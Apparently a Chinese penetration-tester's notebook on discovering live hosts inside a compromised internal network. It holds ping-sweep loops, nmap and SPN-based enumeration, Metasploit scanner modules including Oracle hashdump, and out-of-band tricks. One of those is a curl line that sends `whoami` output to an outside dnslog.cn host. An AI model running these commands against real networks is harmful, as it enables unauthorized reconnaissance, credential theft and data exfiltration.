<a name="1fOoo"></a>
# 
<a name="Oba71"></a>
# 内网存活
nmap探测内网存活扫描<br />nmap -sT -Pn -T4 1.1.1.20 -v<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614779954563-0b195af5-7bb4-4b77-99db-67fbb1ba920d.png#align=left&display=inline&height=259&originHeight=518&originWidth=807&size=49960&status=done&style=none&width=403.5)
<a name="pWLG1"></a>
## 有回显 windows
for /L %I in (1,1,254) Do @ping -w 1 -n 1 10.1.100.%I | findstr "TTL="  （存活ip）<br /> <br />for /L %I in (1,1,254) Do @ping -w 1 -n 1 10.1.%I.1 | findstr "TTL="  （存活的段）<br /> <br /> <br />@for /l %i in (1,1,255) do @ping -n 1 -w 40 192.168.0.%i & if errorlevel 1 (echo 192.168.0.%i>>c:\Noalive.txt) else (echo 192.168.0.%i >>c:\alive.txt)
<a name="EDDvz"></a>
## 有回显 linux(好用!
for i in {1..254} ; do ping -c 1 10.252.$i.254 &>/dev/null && echo 10.252.$i.254 is alive ;done<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611393052733-0171d3dd-8975-454d-b7f4-e74cdaf52b62.png#align=left&display=inline&height=152&originHeight=352&originWidth=961&status=done&style=none&width=415)
<a name="wXjJx"></a>
## 通过SPN探测域内存活主机
接着对拉回来的spn文件进行处理，获取spn记录前面的主机名字<br />grep "CN=" spn.txt | awk -F "," {'print $1'} |  awk -F "=" {'print $2'} > host.txt<br /> <br />接着通过批处理来获取里面的的信息，通过批处理来批量的Ping主机，如果主机有回复的话就会有答复<br />for /f "delims=" %i in (C:\Users\hyadmin\Desktop\2.txt) do @ping -w 1 -n 1 %i | findstr /c ".highsun.com |" >> C:\Users\hyadmin\Desktop\1.txt
<a name="2jLiu"></a>
## msf 探测内网端口
auxiliary/scanner/ftp/ftp_version        #发现内网ftp服务，基于默认21端口<br />auxiliary/scanner/ssh/ssh_version        #发现内网ssh服务，基于默认22端口<br />auxiliary/scanner/telnet/telnet_version  #发现内网telnet服务，基于默认23端口<br />auxiliary/scanner/dns/dns_amp            #发现dns服务，基于默认53端口<br />auxiliary/scanner/http/http_version      #发现内网http服务，基于默认80端口<br />auxiliary/scanner/http/title             #探测内网http服务的标题<br />auxiliary/scanner/smb/smb_version        #发现内网smb服务，基于默认的445端口  <br />use auxiliary/scanner/mssql/mssql_schemadump  #发现内网SQLServer服务,基于默认的1433端口<br />use auxiliary/scanner/oracle/oracle_hashdump  #发现内网oracle服务,基于默认的1521端口<br />auxiliary/scanner/mysql/mysql_version    #发现内网mysql服务，基于默认3306端口<br />auxiliary/scanner/rdp/rdp_scanner        #发现内网RDP服务，基于默认3389端口<br />auxiliary/scanner/redis/redis_server     #发现内网Redis服务，基于默认6379端口<br />auxiliary/scanner/db2/db2_version        #探测内网的db2服务，基于默认的50000端口<br />auxiliary/scanner/netbios/nbname         #探测内网主机的netbios名字<br /> <br />auxiliary/scanner/discovery/udp_sweep    #基于udp协议发现内网存活主机<br />auxiliary/scanner/discovery/udp_probe    #基于udp协议发现内网存活主机<br />auxiliary/scanner/netbios/nbname         #基于netbios协议发现内网存活主机<br />auxiliary/scanner/portscan/tcp           #基于tcp进行端口扫描(1-10000)，如果开放了端口，则说明该主机存活
<a name="Ob1us"></a>
# 回显探测技巧
<a name="kJtFM"></a>
### curl
![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611393052986-440fed6e-da7c-4f7c-ba66-fcff00c2b238.png#align=left&display=inline&height=123&originHeight=245&originWidth=1030&status=done&style=none&width=515)<br />curl命令下载（docker容器可用<br />curl [http://ip:port/1.txt](http://ip:port/1.txt) -o /tmp/  把1.txt文件下载到/tmp目录下<br /> <br />curl `whoami`.86neld.dnslog.cn<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611393053238-4eec95a7-3382-4e73-8d07-05d633ad36df.png#align=left&display=inline&height=309&originHeight=643&originWidth=1550&status=done&style=none&width=746)
<a name="OGlLz"></a>
### Ping
Windows<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611393053551-08a5c2e8-3ece-4e90-9b7b-27dea68c3d1c.png#align=left&display=inline&height=87&originHeight=174&originWidth=965&status=done&style=none&width=483)<br />Linux<br />**反引号！！！！！！！**<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611393053894-641d3c2c-3027-4051-a473-d45e3acd3f0e.png#align=left&display=inline&height=125&originHeight=249&originWidth=977&status=done&style=none&width=489)<br /> <br /> 
